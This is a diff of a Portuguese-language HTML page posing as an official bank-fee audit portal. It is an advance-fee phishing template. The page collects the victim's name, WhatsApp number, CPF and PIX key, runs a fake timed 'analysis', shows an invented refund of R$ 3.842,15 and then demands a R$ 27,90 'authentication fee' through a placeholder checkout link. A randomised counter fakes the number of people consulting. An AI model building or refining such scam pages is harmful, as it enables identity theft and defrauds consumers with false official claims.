@@ -2,139 +2,222 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Econômico - Auditoria Oficial</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Auditoria Central - Consulta Oficial</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; color: #333; }
-        header { background-color: #003366; color: white; padding: 12px; text-align: center; font-size: 14px; font-weight: bold; text-transform: uppercase; }
+        :root {
+            --primary: #001f3f;
+            --accent: #00e676;
+            --error: #ff5252;
+            --bg: #f8fafc;
+            --text: #1e293b;
+            --gray: #64748b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Lexend', sans-serif; background-color: var(--bg); color: var(--text); overflow-x: hidden; }
+
+        /* Header Institucional */
+        header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .logo-box { display: flex; align-items: center; gap: 8px; color: var(--primary); font-weight: 700; font-size: 16px; }
+        .secure-tag { display: flex; align-items: center; gap: 4px; font-size: 11px; color: var(--success); background: #f0fdf4; padding: 4px 8px; border-radius: 20px; color: #166534; }
+
+        /* Estrutura de Matéria */
+        .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; padding-bottom: 100px; }
+        .article-content { padding: 25px 20px; }
+        .kicker { color: #b91c1c; font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        h1 { font-size: 24px; font-weight: 700; line-height: 1.25; margin: 12px 0; letter-spacing: -0.5px; }
+        .author-line { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 13px; color: var(--gray); border-bottom: 1px solid #f1f5f9; padding-bottom: 15px; }
+
+        /* Funil de Interação 10/10 */
+        #funnel-engine { background: #fff; border: 1.5px solid #e2e8f0; border-radius: 16px; padding: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05); }
+        .step { display: none; }
+        .step.active { display: block; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
         
-        .main-container { max-width: 600px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
-        .content { padding: 25px; }
-        
-        /* Estilo Matéria */
-        .tag { color: #cc0000; font-weight: bold; font-size: 14px; text-transform: uppercase; }
-        h1 { font-size: 26px; line-height: 1.2; margin: 10px 0; color: #1a1a1a; }
-        .subtitulo { font-size: 18px; color: #666; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Funil de Verificação (O Miolo) */
-        .funnel-card { background: #fdfdfd; border: 2px solid #003366; border-radius: 10px; padding: 25px; margin-top: 25px; position: relative; }
-        .step { display: none; text-align: center; }
-        .step.active { display: block; }
+        label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 8px; color: var(--primary); }
+        input { width: 100%; padding: 16px; background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 16px; margin-bottom: 20px; transition: all 0.3s; font-family: inherit; }
+        input:focus { border-color: var(--primary); background: #fff; outline: none; box-shadow: 0 0 0 4px rgba(0, 31, 63, 0.1); }
 
-        input { width: 100%; padding: 15px; margin: 15px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
-        .btn-next { background: #003366; color: white; border: none; width: 100%; padding: 18px; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        
-        /* Carregamento */
-        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #003366; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-action { background: var(--primary); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; }
+        .btn-action:active { transform: scale(0.98); }
 
-        /* Resultado Final */
-        .saldo-box { background: #e8f5e9; border: 2px dashed #2e7d32; padding: 20px; border-radius: 8px; margin: 20px 0; }
-        .valor-restituir { color: #2e7d32; font-size: 32px; font-weight: bold; }
-        .taxa-info { background: #fff3e0; border: 1px solid #ff9800; padding: 15px; border-radius: 6px; font-size: 14px; margin-top: 20px; color: #e65100; }
+        /* Loader Circular Profissional */
+        .loader-box { text-align: center; padding: 40px 0; }
+        .circular-loader { width: 60px; height: 60px; border: 4px solid #f1f5f9; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* Popup de Visualização */
-        #popup-viewers { position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.8); color: white; padding: 10px 15px; border-radius: 30px; font-size: 13px; display: flex; align-items: center; gap: 8px; z-index: 999; }
-        .dot { width: 8px; height: 8px; background: #4caf50; border-radius: 50%; display: inline-block; }
+        /* Bloco de Resultado Financeiro */
+        .result-card { background: var(--primary); color: white; border-radius: 16px; padding: 30px 20px; text-align: center; margin-bottom: 25px; background-image: linear-gradient(135deg, #001f3f 0%, #003366 100%); }
+        .result-label { font-size: 13px; opacity: 0.8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; display: block; }
+        .result-amount { font-size: 40px; font-weight: 700; color: var(--accent); display: block; }
+
+        /* Notificação de Tarifa */
+        .tarifa-alert { background: #fff7ed; border: 1px solid #ffedd5; border-radius: 12px; padding: 20px; margin-top: 20px; }
+        .tarifa-header { display: flex; align-items: center; gap: 8px; color: #9a3412; font-weight: 700; font-size: 15px; margin-bottom: 10px; }
+        .tarifa-body { font-size: 14px; color: #c2410c; line-height: 1.5; }
+
+        /* Prova Social Flutuante */
+        .live-status { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 10px 20px; border-radius: 50px; font-size: 12px; white-space: nowrap; display: flex; align-items: center; gap: 8px; z-index: 1000; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
+        .online-dot { width: 8px; height: 8px; background: #4ade80; border-radius: 50%; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); } 100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); } }
     </style>
 </head>
 <body>
 
-<header>Portal de Utilidade Pública - Auditoria Financeira</header>
+<header>
+    <div class="logo-box">
+        <span class="material-symbols-outlined">account_balance</span>
+        AUDITORIA CENTRAL
+    </div>
+    <div class="secure-tag">
+        <span class="material-symbols-outlined" style="font-size: 14px;">verified_user</span>
+        CONEXÃO SEGURA
+    </div>
+</header>
 
-<div class="main-container">
-    <div class="content">
-        <span class="tag">AGORA É LEI / OFICIAL</span>
-        <h1>Sistema libera consulta de tarifas cobradas em empréstimos e cartões de crédito quitados</h1>
-        <p class="subtitulo">Novas diretrizes de auditoria permitem que brasileiros recuperem taxas administrativas de contratos ativos ou finalizados.</p>
+<div class="container">
+    <div class="article-content">
+        <span class="kicker">Edição Nacional • 2026</span>
+        <h1>Sistema de Verificação de Tarifas Bancárias libera saques de até R$ 8.500,00</h1>
+        
+        <div class="author-line">
+            <span class="material-symbols-outlined">description</span>
+            Publicado por <b>Setor de Restituições</b> • Atualizado há 1 min.
+        </div>
 
-        <div class="funnel-card">
+        <div id="funnel-engine">
             
             <div id="step1" class="step active">
-                <h3 style="margin-bottom:15px;">Inicie sua Consulta</h3>
-                <p style="font-size: 14px; color: #666;">Insira seus dados para que a auditoria localize seus contratos.</p>
-                <input type="text" id="nome" placeholder="Nome Completo">
-                <input type="tel" id="tel" placeholder="WhatsApp (DDD)">
-                <button class="btn-next" onclick="nextStep(2)">CONTINUAR</button>
+                <label>Informe seu Nome Completo</label>
+                <input type="text" id="userName" placeholder="Ex: Roberto Silva" autocomplete="name">
+                <label>Seu WhatsApp</label>
+                <input type="tel" id="userTel" placeholder="(00) 00000-0000">
+                <button class="btn-action" onclick="goToStep(2)">
+                    CONTINUAR CONSULTA
+                    <span class="material-symbols-outlined">arrow_forward</span>
+                </button>
             </div>
 
             <div id="step2" class="step">
-                <h3>Verificação de CPF</h3>
-                <p style="font-size: 14px; color: #666;">O CPF é necessário para varredura no sistema interbancário.</p>
-                <input type="number" id="cpf" placeholder="Digite seu CPF">
-                <button class="btn-next" onclick="startLoading()">VERIFICAR SALDO AGORA</button>
-            </div>
-
-            <div id="loading" class="step">
-                <div class="spinner"></div>
-                <p id="loading-text">Auditando contratos vinculados...</p>
+                <label>Informe seu CPF</label>
+                <p style="font-size: 12px; color: var(--gray); margin-bottom: 10px;">Necessário para localizar contratos de empréstimos e cartões ativos ou quitados.</p>
+                <input type="number" id="userCPF" placeholder="000.000.000-00">
+                <button class="btn-action" onclick="runAnalysis()">
+                    VERIFICAR SALDO AGORA
+                    <span class="material-symbols-outlined">search</span>
+                </button>
             </div>
 
             <div id="step3" class="step">
-                <div class="saldo-box">
-                    <p style="margin:0; font-size:12px; color:#1b5e20;">SALDO TOTAL LOCALIZADO:</p>
-                    <div class="valor-restituir">R$ 4.120,85</div>
+                <div class="loader-box">
+                    <div class="circular-loader"></div>
+                    <p id="load-status" style="font-weight: 600;">Varrendo base de dados...</p>
+                    <p style="font-size: 12px; color: var(--gray); margin-top: 10px;">Aguarde o retorno dos servidores bancários.</p>
                 </div>
-                <h3>Onde deseja receber o saque?</h3>
-                <input type="text" placeholder="Chave PIX ou Conta">
-                <p style="font-size:11px; color:#888;"><input type="checkbox" checked> Declaro que sou titular desta conta e aceito os termos.</p>
-                <button class="btn-next" style="background:#28a745; margin-top:15px;" onclick="requestPix()">SOLICITAR SAQUE VIA PIX</button>
             </div>
 
             <div id="step4" class="step">
-                <h3 style="color:#d32f2f">⚠️ Liberação Pendente</h3>
-                <p style="font-size:14px;">Para concluir o envio do seu saldo de <strong>R$ 4.120,85</strong>, o sistema exige o pagamento da Tarifa de Emissão de Guia Bancária.</p>
+                <div class="result-card">
+                    <span class="result-label">Crédito Disponível Localizado</span>
+                    <span class="result-amount">R$ 3.842,15</span>
+                </div>
                 
-                <div class="taxa-info">
-                    <strong>Atenção:</strong> O valor da tarifa é de <strong>R$ 27,90</strong>. Este valor será estornado em sua conta em até 1 minuto após o pagamento, junto com o valor total da restituição.
-                </div>
+                <label>Sua Chave PIX (Para Recebimento)</label>
+                <input type="text" id="pixKey" placeholder="CPF, Celular ou Email">
+                
+                <p style="font-size: 12px; color: var(--gray); text-align: center; margin-bottom: 15px;">
+                    Ao clicar abaixo, você concorda com os termos de devolução imediata.
+                </p>
 
-                <div style="background:#f4f4f4; padding:15px; border-radius:8px; margin-top:15px;">
-                    <p style="font-size:16px;">Total a cair na conta:<br> <strong style="font-size:24px; color:#28a745">R$ 4.148,75</strong></p>
-                </div>
-
-                <button class="btn-next" style="margin-top:20px;" onclick="window.location.href='SEU_LINK_CHECKOUT'">PAGAR TARIFA E RECEBER AGORA</button>
+                <button class="btn-action" style="background: var(--accent); color: #001f3f;" onclick="requestSaque()">
+                    REALIZAR SAQUE VIA PIX
+                    <span class="material-symbols-outlined">bolt</span>
+                </button>
             </div>
 
-        </div> <p style="font-size:14px; color:#666; margin-top:30px;">
-            De acordo com as novas normas de auditoria privada, as instituições financeiras são obrigadas a disponibilizar o acesso aos dados de cobrança para fins de conferência do consumidor...
-        </p>
+            <div id="step5" class="step">
+                <h2 style="color: var(--primary); text-align: center; margin-bottom: 15px;">Saque em Aprovação</h2>
+                <p style="font-size: 14px; text-align: center;">O valor de <b>R$ 3.842,15</b> foi processado, porém o envio exige a autenticação da <b>Tarifa Interbancária de Segurança</b>.</p>
 
+                <div class="tarifa-alert">
+                    <div class="tarifa-header">
+                        <span class="material-symbols-outlined">info</span>
+                        TARIFA DE AUTENTICAÇÃO
+                    </div>
+                    <div class="tarifa-body">
+                        O pagamento da tarifa de <b>R$ 27,90</b> é obrigatório para validar a titularidade. O valor total será estornado em sua conta <b>em até 60 segundos</b> após o pagamento.
+                    </div>
+                </div>
+
+                <div style="background: #f8fafc; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: center; border: 1px solid #e2e8f0;">
+                    <p style="font-size: 13px; color: var(--gray);">Total a ser Creditado:</p>
+                    <p style="font-size: 28px; font-weight: 700; color: #16a34a;">R$ 3.870,05</p>
+                </div>
+
+                <button class="btn-action" onclick="window.location.href='https://checkout.sigilo.com/sua-url-aqui'">
+                    AUTENTICAR E RECEBER PIX
+                    <span class="material-symbols-outlined">payments</span>
+                </button>
+            </div>
+
+        </div> <div style="margin-top: 40px; border-top: 1px solid #f1f5f9; padding-top: 20px;">
+            <p style="font-size: 13px; color: var(--gray); line-height: 1.6;">
+                <b>Nota Fiscal:</b> O serviço de auditoria independente funciona como um intermediário entre o consumidor e as bases de dados bancárias. O ressarcimento é garantido para cobranças de tarifas abusivas de manutenção de conta e juros de mora acima do teto legal...
+            </p>
+        </div>
     </div>
 </div>
 
-<div id="popup-viewers">
-    <span class="dot"></span>
-    <span id="view-count">1.452</span> pessoas consultando agora
+<div class="live-status">
+    <div class="online-dot"></div>
+    <span id="live-count">1.842</span> pessoas consultando agora
 </div>
 
 <script>
-    function nextStep(stepId) {
+    function goToStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        if(typeof stepId === 'string') {
-            document.getElementById(stepId).classList.add('active');
-        } else {
-            document.getElementById('step' + stepId).classList.add('active');
-        }
+        document.getElementById('step' + n).classList.add('active');
+        window.scrollTo({top: 200, behavior: 'smooth'});
     }
 
-    function startLoading() {
-        nextStep('loading');
-        setTimeout(() => { document.getElementById('loading-text').innerText = "Calculando juros acumulados..."; }, 1500);
-        setTimeout(() => { nextStep(3); }, 4000);
+    function runAnalysis() {
+        goToStep(3);
+        const msgs = [
+            "Acessando base de contratos...",
+            "Localizando juros abusivos...",
+            "Calculando correções monetárias...",
+            "Finalizando relatório..."
+        ];
+        let i = 0;
+        const interval = setInterval(() => {
+            if(i < msgs.length) {
+                document.getElementById('load-status').innerText = msgs[i];
+                i++;
+            } else {
+                clearInterval(interval);
+                goToStep(4);
+            }
+        }, 1200);
     }
 
-    function requestPix() {
-        nextStep('loading');
-        document.getElementById('loading-text').innerText = "Processando ordem de saque...";
-        setTimeout(() => { nextStep(4); }, 3000);
+    function requestSaque() {
+        goToStep(3);
+        document.getElementById('load-status').innerText = "Processando ordem de saque...";
+        setTimeout(() => { goToStep(5); }, 2500);
     }
 
-    // Lógica do contador de pessoas
+    // Contador realístico
     setInterval(() => {
-        let count = Math.floor(Math.random() * (1600 - 1400) + 1400);
-        document.getElementById('view-count').innerText = count.toLocaleString();
-    }, 5000);
+        let current = parseInt(document.getElementById('live-count').innerText.replace('.', ''));
+        let next = current + (Math.random() > 0.5 ? 1 : -1) * Math.floor(Math.random() * 5);
+        document.getElementById('live-count').innerText = next.toLocaleString('pt-BR');
+    }, 3000);
 </script>
 
 </body>
